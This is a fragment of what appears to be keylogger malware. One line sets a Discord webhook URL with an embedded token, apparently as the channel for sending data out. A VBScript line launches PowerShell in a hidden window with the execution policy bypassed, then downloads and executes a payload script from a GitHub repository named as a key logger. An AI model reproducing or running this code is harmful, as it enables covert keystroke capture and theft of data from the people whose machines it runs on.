...
$webhook = "https://discordapp.com/api/webhooks/1355328311764586556/dBf-PNhYIrs7uisoPC6fSB6XUol8v7DQo53O6PT7AwwdMS-ga04wwsJy7A4sGwXN-Y7p"  
$tempDir = $env:TEMP  
...
objShell.Run "powershell -Exec Bypass -Window Hidden -C `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/thedunces/CherryCreek-Key-Logger/refs/heads/main/payload.ps1?token=GHSAT0AAAAAADBJ5M4TMTKPOFSHH3UUQMSQZ7HG6BA')`"", 0  
